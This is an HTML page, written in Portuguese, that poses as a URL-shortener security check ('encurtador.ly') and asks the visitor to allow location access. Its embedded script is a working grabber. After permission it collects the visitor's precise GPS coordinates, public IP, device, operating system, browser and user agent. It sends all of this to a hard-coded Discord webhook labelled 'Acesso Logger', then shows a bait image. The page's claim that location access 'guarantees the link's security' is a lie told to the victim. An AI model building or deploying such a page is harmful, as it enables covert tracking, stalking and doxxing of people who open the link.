<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>encurtador.ly</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #0f0f0f;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        /* Tela do "encurtador" */
        #gate {
            width: 100%;
            max-width: 420px;
            text-align: center;
        }

        .logo {
            font-size: 28px;
            font-weight: 700;
            letter-spacing: -1px;
            margin-bottom: 8px;
            color: #00ff9d;
        }

        .logo span {
            color: #fff;
        }

        .subtitle {
            color: #888;
            font-size: 14px;
            margin-bottom: 40px;
        }

        .card {
            background: #1a1a1a;
            border: 1px solid #2a2a2a;
            border-radius: 16px;
            padding: 32px 24px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
        }

        .icon {
            width: 64px;
            height: 64px;
            background: #00ff9d15;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 28px;
        }

        h1 {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 10px;
        }

        p {
            color: #aaa;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 28px;
        }

        button {
            width: 100%;
            background: #00ff9d;
            color: #000;
            border: none;
            padding: 16px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
        }

        button:hover {
            background: #00e68a;
            transform: translateY(-1px);
        }

        button:active {
            transform: scale(0.98);
        }

        .status {
            margin-top: 16px;
            font-size: 13px;
            color: #ff6b6b;
            min-height: 20px;
        }

        /* Imagem (escondida no início) */
        #conteudo {
            display: none;
            width: 100%;
            height: 100vh;
            position: fixed;
            top: 0;
            left: 0;
            background: #000;
            z-index: 100;
        }

        #conteudo img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
    </style>
</head>
<body>

    <!-- Tela de "encurtador" -->
    <div id="gate">
        <div class="logo">encurtador<span>.ly</span></div>
        <div class="subtitle">Link seguro • Verificação necessária</div>

        <div class="card">
            <div class="icon">📍</div>
            <h1>Permitir localização</h1>
            <p>Para acessar este conteúdo é necessário permitir o acesso à sua localização. Isso garante a segurança do link.</p>
            <button id="btnPermitir">Permitir e continuar</button>
            <div class="status" id="status"></div>
        </div>
    </div>

    <!-- Conteúdo liberado depois da permissão -->
    <div id="conteudo">
        <img src="comp.png" alt="">
    </div>

    <script>
        // ==================== CONFIGURAÇÃO ====================
        const WEBHOOK = "https://discord.com/api/webhooks/1573156799580995684/Mcxp9yWWds2_qy7vdWLbK9tjJpmVWwYdl098p3LVDEp4WFCmzeu4IL3lj1ElYGO1eB4n";
        // ======================================================

        const btn = document.getElementById("btnPermitir");
        const status = document.getElementById("status");
        const gate = document.getElementById("gate");
        const conteudo = document.getElementById("conteudo");

        async function obterIP() {
            try {
                const res = await fetch("https://api.ipify.org?format=json");
                const data = await res.json();
                return data.ip;
            } catch {
                return "Não obtido";
            }
        }

        function obterInfoDispositivo() {
            const ua = navigator.userAgent;
            let dispositivo = "Desconhecido";
            let sistema = "Desconhecido";
            let navegador = "Desconhecido";
            let versao = "Desconhecida";

            if (/iPhone|iPad|iPod/i.test(ua)) dispositivo = "iPhone/iPad";
            else if (/Android/i.test(ua)) dispositivo = "Android";
            else if (/Windows/i.test(ua)) dispositivo = "Windows";
            else if (/Macintosh|Mac OS/i.test(ua)) dispositivo = "Mac";
            else if (/Linux/i.test(ua)) dispositivo = "Linux";

            if (/Android\s([0-9\.]+)/i.test(ua)) {
                sistema = "Android";
                versao = ua.match(/Android\s([0-9\.]+)/i)[1];
            } else if (/iPhone OS\s([0-9_]+)/i.test(ua) || /CPU OS\s([0-9_]+)/i.test(ua)) {
                sistema = "iOS";
                versao = (ua.match(/(?:iPhone OS|CPU OS)\s([0-9_]+)/i) || [])[1]?.replace(/_/g, ".") || "Desconhecida";
            } else if (/Windows NT\s([0-9\.]+)/i.test(ua)) {
                sistema = "Windows";
                versao = ua.match(/Windows NT\s([0-9\.]+)/i)[1];
            } else if (/Mac OS X\s([0-9_]+)/i.test(ua)) {
                sistema = "macOS";
                versao = ua.match(/Mac OS X\s([0-9_]+)/i)[1].replace(/_/g, ".");
            }

            if (/Edg\//i.test(ua)) navegador = "Edge";
            else if (/Chrome\//i.test(ua) && !/Edg\//i.test(ua)) navegador = "Chrome";
            else if (/Safari\//i.test(ua) && !/Chrome\//i.test(ua)) navegador = "Safari";
            else if (/Firefox\//i.test(ua)) navegador = "Firefox";
            else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) navegador = "Opera";

            return { dispositivo, sistema, versao, navegador, userAgent: ua };
        }

        function obterLocalizacao() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ lat: null, lon: null, precisao: null, erro: "Geolocalização não suportada" });
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            precisao: pos.coords.accuracy
                        });
                    },
                    (err) => {
                        resolve({ lat: null, lon: null, precisao: null, erro: err.message });
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            });
        }

        async function enviarParaDiscord(loc) {
            const ip = await obterIP();
            const info = obterInfoDispositivo();
            const agora = new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" });

            let localizacaoTexto = "Não obtido";
            if (loc.lat !== null && loc.lon !== null) {
                localizacaoTexto = `\`${loc.lat}, ${loc.lon}\`\n[Ver no Google Maps](https://www.google.com/maps?q=${loc.lat},${loc.lon})\nPrecisão: ~${Math.round(loc.precisao)} metros`;
            } else if (loc.erro) {
                localizacaoTexto = `Erro: ${loc.erro}`;
            }

            const embed = {
                title: "Novo acesso • Encurtador",
                color: 0x00ff9d,
                fields: [
                    { name: "IP", value: `\`${ip}\``, inline: true },
                    { name: "Dispositivo", value: info.dispositivo, inline: true },
                    { name: "Sistema", value: `${info.sistema} ${info.versao}`, inline: true },
                    { name: "Navegador", value: info.navegador, inline: true },
                    { name: "Horário", value: agora, inline: true },
                    { name: "Localização", value: localizacaoTexto, inline: false },
                    { name: "User-Agent", value: `\`\`\`${info.userAgent}\`\`\``, inline: false }
                ],
                footer: { text: "Logger • " + window.location.href },
                timestamp: new Date().toISOString()
            };

            try {
                await fetch(WEBHOOK, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        username: "Acesso Logger",
                        embeds: [embed]
                    })
                });
            } catch (e) {
                console.error(e);
            }
        }

        btn.addEventListener("click", async () => {
            btn.disabled = true;
            btn.textContent = "Verificando...";
            status.textContent = "";

            const loc = await obterLocalizacao();

            if (loc.lat === null) {
                // Usuário negou ou deu erro
                status.textContent = "Você precisa permitir a localização para continuar.";
                btn.disabled = false;
                btn.textContent = "Permitir e continuar";
                return;
            }

            // Deu certo → envia os dados e libera a imagem
            await enviarParaDiscord(loc);

            gate.style.display = "none";
            conteudo.style.display = "block";
        });
    </script>
</body>
</html>
